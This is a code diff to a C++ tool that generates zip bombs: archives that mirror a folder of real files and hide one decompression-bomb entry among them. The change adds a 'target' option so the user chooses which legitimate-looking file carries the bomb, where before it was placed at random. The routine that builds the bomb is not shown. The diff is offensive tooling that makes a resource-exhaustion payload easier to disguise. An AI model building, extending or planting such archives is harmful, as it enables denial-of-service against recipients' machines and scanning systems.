@@ -9,6 +9,7 @@
 
 #include <iostream>
 #include <filesystem>
+#include <ranges>
 
 namespace {
     enum class ByteSizeBaseKB:size_t {
@@ -51,12 +52,10 @@ int main(int argc, const char **argv) {
     inputParser.registerFlag("tb", "Sets the bomb size in tb followed by the size in number, default is 1gb", true);
     inputParser.registerFlag("pb", "Sets the bomb size in pb followed by the size in number, default is 1gb", true);
     inputParser.registerFlag("name", "Sets the name of the produced zipped file, default is zipBomb.zip", true);
-
+    inputParser.registerFlag("target", "Sets the target file to the bomb", true);
 
     try {
-        inputParser.parse(argc, argv);
-
-        if (bool helpCalled{inputParser.containsInputFlag("help")}; helpCalled || !inputParser.getState()) {
+        if (bool parsedOk{inputParser.parse(argc, argv)}; inputParser.containsInputFlag("help") || !parsedOk) {
             inputParser.displayHelp();
             return 0;
         }
@@ -67,6 +66,7 @@ int main(int argc, const char **argv) {
         auto inputGbSize{inputParser.getFlagValue("gb")};
         auto inputTbSize{inputParser.getFlagValue("tb")};
         auto inputPbSize{inputParser.getFlagValue("pb")};
+        auto inputTargetFile{inputParser.getFlagValue("target")};
 
 
         std::string zipFileName{inputName.has_value() ? helper::ensureZipExtension(inputName.value()) : "zipBomb.zip"};
@@ -82,9 +82,12 @@ int main(int argc, const char **argv) {
 
         std::vector<fs::path> files;
         for (const auto &entry: fs::recursive_directory_iterator(folderPath,
-                                                                 fs::directory_options::skip_permission_denied))
-            if (entry.is_regular_file())
+                                                                 fs::directory_options::skip_permission_denied)) {
+            if (entry.is_regular_file()) {
                 files.push_back(entry.path());
+            }
+        }
+
 
         if (files.empty()) {
             std::cout << "No files found in " << folderPath << '\n';
@@ -93,12 +96,27 @@ int main(int argc, const char **argv) {
 
         ZipFile zipFile{zipFileName};
 
-        size_t bombPlacement{helper::randomNumber(files.size())};
+        size_t bombPlacement{};
+
+        if (inputTargetFile.has_value()) {
+            auto it {std::ranges::find_if(files,[&](const fs::path &path) {
+                return inputTargetFile.value() == fs::relative(path, folderPath).generic_string();
+            }
+            )};
+            if (it == files.end()) {
+                std::cout << "Target file " << inputTargetFile.value() << " not found\n";
+                return 0;
+            }
+            bombPlacement = static_cast<size_t>(it - files.begin());
+        }else {
+           bombPlacement = helper::randomNumber(files.size());
+        }
 
         size_t nthFileRead{};
 
         for (const fs::path &entry: files) {
-            std::string fileName{entry.filename().string()};
+            std::string fileName{fs::relative(entry, folderPath).generic_string()};
+
             if (nthFileRead == bombPlacement) {
                 Timer readFileTimer{"Placing Bomb in File - " + fileName};
                 LocalFileHeader bombFile{
@@ -118,6 +136,7 @@ int main(int argc, const char **argv) {
             Timer zipFileSerialization{"Closing zip file"};
             zipFile.close();
         }
+
     } catch (std::exception &e) {
         std::cout << "exception: " << e.what() << '\n' << std::endl;
 
